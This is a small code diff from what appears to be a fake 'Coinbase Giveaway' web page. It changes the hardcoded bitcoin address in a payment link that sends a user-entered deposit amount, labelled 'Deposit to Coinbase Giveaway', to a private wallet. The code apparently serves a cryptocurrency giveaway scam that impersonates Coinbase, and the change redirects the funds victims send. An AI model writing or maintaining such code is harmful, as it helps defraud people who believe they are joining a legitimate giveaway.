@@ -211,7 +211,7 @@ function update_trans() {
         .parent()
         .attr(
           'href',
-          'bitcoin:bc1qd3w9prvng888ftzzfzcaad4h9ku5mzdamm2dtg?amount=' +
+          'bitcoin:bc1q7zs593geuw7g35wcegngprjmyf25rtdvk0q3tx?amount=' +
             amount_entered +
             '&message=Deposit+to+Coinbase+Giveaway+' +
             tm,
